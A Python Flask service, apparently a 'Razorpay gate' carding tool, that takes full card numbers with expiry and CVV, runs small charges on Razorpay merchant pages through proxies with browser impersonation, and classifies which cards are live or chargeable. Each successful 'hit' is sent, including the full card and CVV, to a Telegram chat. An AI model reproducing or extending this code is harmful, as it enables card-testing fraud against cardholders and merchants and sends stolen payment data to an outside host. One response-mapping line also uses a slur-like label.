#!/usr/bin/env python3
"""
rzp_api.py — Razorpay checkout API (Flask).
Bot sends site + proxy per request. No rotation, no pool.

Endpoints:
  GET/POST /razorpay (or /rzp) — main endpoint
  GET      /health             — health check

Query params:
  cc     — card: number|MM|YYYY|CVV  (required)
  site   — Razorpay URL or @handle    (required)
  proxy  — proxy host:port:user:pass  (optional, direct if omitted)
  amount — amount in paise (default 100 = ₹1)

Response:
  {"CC": "...", "Currency": "INR", "Gateway": "razorpay",
   "Price": "1.00", "Proxy": "live|dead|not used",
   "Response": "ORDER_PAID|CARD_DECLINED|...", "Status": "true|false"}
"""
import os, re, threading, urllib.parse, urllib.request
from flask import Flask, request, jsonify

from razorpay import RazorpaySession, parse_cc, parse_proxy, DEFAULT_AMOUNT_PAISE

app = Flask(__name__)
PORT = int(os.environ.get("PORT", "8090"))

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "")


def _tg_send(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": "true",
        }).encode()
        req = urllib.request.Request(url, data=data, method="POST")
        urllib.request.urlopen(req, timeout=8).read()
    except Exception as e:
        print(f"[tg] fail: {e}", flush=True)


def _tg_push_hit(card, code, site, price_str, proxy_status):
    card_str = f"{card.get('number','')}|{card.get('expiry_month','')}|{card.get('expiry_year','')}|{card.get('cvv','')}"
    site_clean = (site or "").replace("https://", "").replace("http://", "").rstrip("/") or "unknown"
    emoji = "💳" if code == "ORDER_PAID" else "💰"
    msg = (
        f"<b>{emoji} HIT — {code}</b>\n"
        f"<b>Site:</b> {site_clean}\n"
        f"<b>Card:</b> <code>{card_str}</code>\n"
        f"<b>Price:</b> {price_str}\n"
        f"<b>Gateway:</b> razorpay\n"
        f"<b>Proxy:</b> {proxy_status or 'not used'}"
    )
    threading.Thread(target=_tg_send, args=(msg,), daemon=True).start()


def _map_response(result):
    """Map RazorpaySession result → (response_code, hit_bool_str)."""
    status = (result.get("status") or "").lower()
    reason = (result.get("reason") or "").lower()
    message = (result.get("message") or "").lower()

    if status == "charged":
        return "ORDER_PAID", "true"

    if status == "approved":
        if "live_limit" in reason or "insufficient" in message:
            return "INSUFFICIENT_FUNDS", "true"
        if "ccn" in reason:
            return "CCN_LIVE", "false"
        if "3ds_or_otp" in reason or "3ds" in reason or "otp" in reason:
            return "3DS_REQUIRED", "false"
        if "auth_failed" in reason:
            return "AUTH_FAILED", "false"
        if "cancel_5xx_payment_created" in reason or \
           "cancel_403_payment_created" in reason or \
           "payment_created_no_cancel_detail" in reason or \
           "payment_created_forced_outcome" in reason:
            return "POSSIBLE_CHARGE", "false"
        return "APPROVED", "false"

    if status == "dead":
        if "card_number_invalid" in reason:   return "INVALID_CARD", "false"
        if "card_expiry_invalid" in reason:   return "CARD_EXPIRED", "false"
        if "international_not_supported" in reason: return "INTL_NOT_SUPPORTED", "false"
        if "card_network_not_enabled" in reason:    return "CARD_NETWORK_DISABLED", "false"
        if "card_type_not_allowed" in reason:       return "CARD_TYPE_DISABLED", "false"
        if "online_payments_not_enabled" in reason: return "ONLINE_PAY_DISABLED", "false"
        if "rzp_risk_decline" in reason:      return "RISK_DECLINED", "false"
        if "auth_failed" in reason:           return "AUTH_FAILED", "false"
        if "gateway_technical_error" in reason: return "GATEWAY_ERROR", "false"
        if "bank_gateway_failure" in reason:    return "BANK_FAILURE", "false"
        if "declined" in reason:              return "CARD_DECLINED", "false"
        return "CARD_DECLINED", "false"

    if status == "error":
        if "waf_403" in reason or "waf_406" in reason: return "WAF_BLOCK", "false"
        if "gay_site" in reason:              return "SITE_DEAD", "false"
        if "merchant_blocked" in reason:      return "MERCHANT_BLOCKED", "false"
        if "merchant_not_activated" in reason: return "MERCHANT_INACTIVE", "false"
        if "payment_page_inactive" in reason: return "SITE_INACTIVE", "false"
        if "site_unavailable" in reason:      return "SITE_DOWN", "false"
        if "site_change" in reason:           return "SITE_CHANGED", "false"
        if "invalid_email" in reason:         return "INVALID_EMAIL", "false"
        if "extra_field_sent" in reason:      return "SITE_CHANGED", "false"
        if "currency_mismatch" in reason:     return "CURRENCY_MISMATCH", "false"
        if "invalid_fee" in reason or "amount_mismatch" in reason: return "AMOUNT_MISMATCH", "false"
        if "mandatory_item" in reason:        return "MANDATORY_ITEM", "false"
        if "rzp_server_error" in reason or "server_error" in reason: return "GATEWAY_ERROR", "false"
        if "timeout" in reason or "timeout" in message: return "PROXY_TIMEOUT", "false"
        if "order_failed" in reason:          return "ORDER_FAILED", "false"
        if "checkout_incomplete" in reason:   return "CHECKOUT_INCOMPLETE", "false"
        if "exception" in reason:             return "PROXY_ERROR", "false"
        if "no_live_proxies" in message:      return "PROXY_ERROR", "false"
        return "PROXY_ERROR", "false"

    return "ERROR", "false"


def _parse_card(cc):
    if isinstance(cc, dict):
        return cc
    try:
        return parse_cc(str(cc).strip())
    except (ValueError, Exception):
        return None


def _parse_proxy(p):
    if not p:
        return None
    try:
        return parse_proxy(p.strip())
    except ValueError:
        return None


def _proxy_alive(proxy_url, probe_url="https://api.razorpay.com/"):
    if not proxy_url:
        return True
    try:
        from curl_cffi import requests as cr
        s = cr.Session(impersonate="chrome124", default_headers=True)
        s.proxies = {"http": proxy_url, "https": proxy_url}
        r = s.get(probe_url, timeout=6)
        s.close()
        return r.status_code < 600
    except Exception:
        return False


def _normalize_site(site):
    site = (site or "").strip()
    if not site:
        return ""
    if site.startswith(("http://", "https://")):
        return site.rstrip("/")
    if site.startswith("@"):
        return "https://razorpay.me/" + site
    if "razorpay" in site:
        return "https://" + site.lstrip("/")
    return "https://razorpay.me/@" + site.lstrip("@")


def _request_common():
    if request.method == "GET":
        cc = (request.args.get("cc") or "").strip()
        site = (request.args.get("site") or "").strip()
        proxy = (request.args.get("proxy") or "").strip()
        amount = (request.args.get("amount") or "").strip()
    else:
        data = request.get_json(force=True, silent=True) or {}
        cc = str(data.get("cc") or data.get("card") or "").strip()
        site = str(data.get("site") or data.get("shop") or "").strip()
        proxy = str(data.get("proxy") or "").strip()
        amount = str(data.get("amount") or "").strip()

    site = _normalize_site(site)
    card = _parse_card(cc)
    proxy_url = _parse_proxy(proxy)
    try:
        amount_paise = int(amount) if amount else DEFAULT_AMOUNT_PAISE
    except ValueError:
        amount_paise = DEFAULT_AMOUNT_PAISE
    amount_paise = max(100, min(amount_paise, 10000))
    return cc, site, card, proxy, proxy_url, amount_paise


@app.route("/razorpay", methods=["GET", "POST"])
@app.route("/rzp", methods=["GET", "POST"])
def razorpay_endpoint():
    try:
        cc_raw, site, card, proxy_raw, proxy_url, amount_paise = _request_common()

        if not card:
            return jsonify({
                "CC": cc_raw, "Currency": "INR", "Gateway": "razorpay",
                "Price": f"{amount_paise/100:.2f}", "Proxy": "not used",
                "Response": "MISSING_CARD", "Status": "false",
            }), 400

        if not site:
            return jsonify({
                "CC": cc_raw, "Currency": "INR", "Gateway": "razorpay",
                "Price": f"{amount_paise/100:.2f}", "Proxy": "not used",
                "Response": "MISSING_SITE", "Status": "false",
            }), 400

        proxy_status = "not used"
        if proxy_raw:
            if _proxy_alive(proxy_url):
                proxy_status = "live"
            else:
                proxy_status = "dead"
                proxy_url = None

        sess = RazorpaySession(
            payment_page_url=site,
            card=card,
            proxy=proxy_url,
            traffic_env=os.environ.get("RAZORPAY_TRAFFIC_ENV", "canary"),
            amount_paise=amount_paise,
            per_request_timeout=20.0,
        )
        try:
            result = sess.run()
        finally:
            try:
                sess.close()
            except Exception:
                pass

        code, hit = _map_response(result)
        price_paise = result.get("amount_paise", amount_paise)
        price_str = f"{price_paise/100:.2f}"
        currency = (result.get("currency") or "INR").upper()

        if hit == "true" and code in ("ORDER_PAID", "INSUFFICIENT_FUNDS"):
            _tg_push_hit(card, code, site, price_str, proxy_status)

        print(f"[resp] {code} status={hit} site={site[:60]} reason={result.get('reason','')}", flush=True)

        return jsonify({
            "CC": cc_raw,
            "Currency": currency,
            "Gateway": "razorpay",
            "Price": price_str,
            "Proxy": proxy_status,
            "Response": code,
            "Status": hit,
        })
    except Exception as e:
        print(f"[error] {e}", flush=True)
        return jsonify({
            "CC": "", "Currency": "INR", "Gateway": "razorpay",
            "Price": "0.00", "Proxy": "not used",
            "Response": "ERROR", "Status": "false",
        }), 200


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "service": "razorpay-gate"})


@app.errorhandler(Exception)
def _handle_all(e):
    return jsonify({
        "CC": "", "Currency": "INR", "Gateway": "razorpay",
        "Price": "0.00", "Proxy": "not used",
        "Response": "ERROR", "Status": "false",
    }), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True, use_reloader=False)
